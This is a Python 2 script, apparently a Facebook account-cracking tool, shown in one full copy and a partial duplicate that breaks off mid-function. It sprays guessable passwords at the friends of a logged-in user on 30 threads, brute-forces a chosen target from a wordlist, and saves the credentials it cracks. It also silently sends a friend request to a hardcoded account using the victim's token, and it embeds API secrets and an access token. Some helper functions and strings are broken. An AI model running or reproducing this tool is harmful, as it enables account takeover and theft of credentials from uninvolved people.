
##!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
		
		
#### LOGO ####
logo = """
  
 __    __                    __  __       
/  \  /  |                  /  |/  |      
$$  \ $$ |  ______       __ $$/ $$ |____  
$$$  \$$ | /      \     /  |/  |$$      \ 
$$$$  $$ | $$$$$$  |    $$/ $$ |$$$$$$$  |
$$ $$ $$ | /    $$ |    /  |$$ |$$ |  $$ |
$$ |$$$$ |/$$$$$$$ |    $$ |$$ |$$ |__$$ |
$$ | $$$ |$$    $$ |    $$ |$$ |$$    $$/ 
$$/   $$/  $$$$$$$/__   $$ |$$/ $$$$$$$/  
                  /  \__$$ |              
                  $$    $$/               
                   $$$$$$/                

\033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
\033[0;39m║\033[0;36m* \033[0;36mAuthor\033[1;36m : \033[1;31mNajibullah_\033[0;31m║
\033[0;39m║\033[1;33m* \033[1;33mWhatsapp  \033[1;33m : \033[1;33m\033[4m+93787196383\033[0m \033[0;31m║
\033[0;39m║\033[0;36m* \033[0;32mFacebook \033[1;32m: \033[1;32mNajibullah Qalamyar\033[0;31m║
\033[0;39m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mNajibullah Qalamyar \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\x1b[0;31m⚔════════════════════════☠════════════════════════⚔"
print  """\x1b[0;31m [¤] \x1b[0;31mKU SO DHAWOW\x1b[0;31m  \033[1;96m   
\033[1;96m[¤] \x1b[0;31mWHATSAPP : +93787196383\x1b[1;96m  
\033[1;93m[¤] \x1b[0;31mFACEBOOK : Najibullah Qalamyar\x1b[1;96m  
\033[1;93m[¤] \x1b[0;31mYOUTUBE  : Najib Lala \x1b[0;31m"""
print " \x1b[1;93m⚔═══════════════════════☠════════════════════════⚔"



def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[☆] \x1b[1;91mASALAM ALIKOM WELCOME TO MY HACK  \x1b[1;96m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful...'
				os.system('xdg-open https://www.youtube.com/watch?v=lcNxqvuQlcM')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91m[!] nio internet la aan ba ku haysa"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92m[!] WAA LAGA XAYIRA EE MID KALE GALI")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email WAA KHALAD")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mfacebook ayaa ka xayiray"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40m══qof ka hacking"	
	print "\033[1;32;40m[2] \033[1;33;40m══Update toolkan"																														
	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════☠════════════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[1] \033[1;33;40m══Asxaab tada ka hacking"
	print "\x1b[1;32;40m[2] \033[1;33;40m══Qof kale Asxaab tiisa ka hacking"
	print "\x1b[1;32;40m[3] \033[1;33;40m══Qof si toosa oga hacking"
	print "\x1b[1;32;40m[4] \033[1;33;40m══QOF File ka haysid ka hacking"
	print "\x1b[1;32;40m[0] \033[1;33;40m══DIb oga noqo"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;93m[✺] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[*] Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;40m[✺] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;92m[✺] ID GANI MA JIRO!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;40m[✺] WAA LA RADINAYA IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile lama helin'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;40m[✺] inta qof ku jira : \033[1;94m"+str(len(id))
	jalan('\033[1;34;40m[✺] Fadlan suug...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Bilaabmay\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
	print "   \033[1;31;48m●══════════════════════FIKRADO══════════════════════●"

	jalan('            \033[1;91mYaxye waa uu bilaaway inu qofka ka hacking gareeyo...')
	print  "  \033[1;36;48m ●══════════════════════HACKER══════════════════════●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass1 + '\n'
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass1 + '\n'
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass2 + '\n'
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass2 + '\n'
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = 'Pakistan123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass3 + '\n'
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass3 + '\n'
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = '000786'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass4 + '\n'
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass4 + '\n'
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass5 + '\n'
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass5 + '\n'
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Pakistan'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass6 + '\n'
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass6 + '\n'
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
 										
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[1;31;40m[✓] Yaxye hawshi waa uu dhameeyay\033[1;96m....'
	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
	print """
\033[1;31;40m ●═════════════════════fikrado═══════════════════════●	           """
	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
	super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ●════════════════════════☠════════════════════════●'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ●════════════════════════☠════════════════════════●'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print  "\033[1;36;40m ●════════════════════════☠════════════════════════●"
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	login()
!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)


def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;97mToken\033[1;91m : \033[1;95mCopy👉 \033[1;92mEAAAAUaZA8jlABAEZBmW0yH8w0R2XhpqqNiaQvKDkm1wCFazEcrJEzJThJrjZC3fuBFP6DFNmNnZB8ueUyVZCH7zPMulcTHZBa9ZCRHTTRTc0wneLqx5BZBruQbJQAx5pssqNnZB9qH6oHFjqWJf0yoOFkawm7hDqVYM8wCALx4xv7hi4ERoBPpgSGKAsm95Xt8fcZD \033[1;96m👈 Without fb ID free login Copy Paste & Enter👉\033[1;92m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		Name = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()


#### LOGO ####
logo = """
\033[1;91m Najibjan welcome to my crack
      𝐍𝐞𝐯𝐞𝐫    𝐓𝐫𝐮𝐬𝐭  𝐀𝐧𝐲𝐨𝐧𝐞 
   𝐢𝐭'𝐬 𝐦𝐲 𝐑𝐮𝐥𝐞    𝐅𝐮𝐜𝐤 𝐭𝐡𝐞 𝐒𝐲𝐬𝐭𝐞𝐦 

      𝐅𝐮𝐜𝐤 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 𝐭𝐞𝐚𝐦 ☠

     𝐋𝐨𝐯𝐞 𝐍𝐞𝐯𝐞𝐫 𝐃𝐢𝐞   👉𝐇👈
\033[1;31m\033[1;31m╔══════════════════════════════════════════════════╗
\033[1;31m\033[1;31m║\033[0;33m\033[1;33m* AUTHOR  : \033[1;39mNajibjan                 \033[1;31m║
\033[1;31m\033[1;31m║\033[0;33m\033[1;33m* WhatsApp:+93787196383    \033[1;31m║
\033[1;31m\033[1;31m║\033[0;33m\033[1;33m* youtube : \033[1;39mhttps://Najib Lala\033[1;31m║
\033[1;31m\033[1;31m╚══════════════════════════════════════════════════╝"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mLoging In \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt☆Cybery\033[1;96m•◈•───────────────•◈•"
print  """             Najibjan
     𝐍𝐞𝐯𝐞𝐫    𝐓𝐫𝐮𝐬𝐭  𝐀𝐧𝐲𝐨𝐧𝐞 
    𝐢𝐭'𝐬 𝐦𝐲 𝐑𝐮𝐥𝐞    𝐅𝐮𝐜𝐤 𝐭𝐡𝐞 𝐒𝐲𝐬𝐭𝐞𝐦 

       𝐅𝐮𝐜𝐤 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 𝐭𝐞𝐚𝐦 ☠

        𝐋𝐨𝐯𝐞 𝐍𝐞𝐯𝐞𝐫 𝐃𝐢𝐞   👉𝐇👈
"""
print "\033[1;96m•◈•───────────────•◈•\033[1;92mHemt♡Cybery\033[1;96m•◈•───────────────•◈•"
jalan("    \033[1;93m _______              __._____.        __               
 \      \ _____      |__|__\_ |__     |__|____    ____  
 /   |   \\__  \     |  |  || __ \    |  \__  \  /    \ 
/    |    \/ __ \_   |  |  || \_\ \   |  |/ __ \|   |  \
\____|__  (____  /\__|  |__||___  /\__|  (____  /___|  /
        \/     \/\______|       \/\______|    \/     \/ 
jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
jalan("    \033[1;93m▇▇\033[1;95m           WellCome to Hemt Cybery    \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;91m              👇  AUTHOR  👇          \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m          This Tools Is Created By    \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m                Hemt Cybery         \033[1;93m▇▇")
jalan("    \033[1;93m▇▇\033[1;92m       YOUTUBE   Nadarm🖕  \033[1;93m▇▇")
jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")

CorrectUsername = "najib"
CorrectPassword = "khan"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \033[1;91mUSERNAME \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \033[1;91mPASSWORD \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:AMiR BabeR
            loop = 'false'
        else:
            print "Serious Please"
            os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
    else:
        print "Wrong Dear!"
        os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')

####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m1.\x1b[1;96m Login With Facebook  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m2.\x1b[1;95m Login With Token"
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m3.\x1b[1;93m Get Access Token App Fb"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;92m0.\033[1;91m Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;96mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan("\033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account")
		jalan("\033[1;91mWarning  \033[1;92mUse a New Account To Login")
		print('\033[1;97m\x1b[1;96m................LOGIN WITH FACEBOOK................\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[] \x1b[1;93mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;93mPassword      \x1b[1;93m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open https://youtu.be/OJb1gO7KMrc  ')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
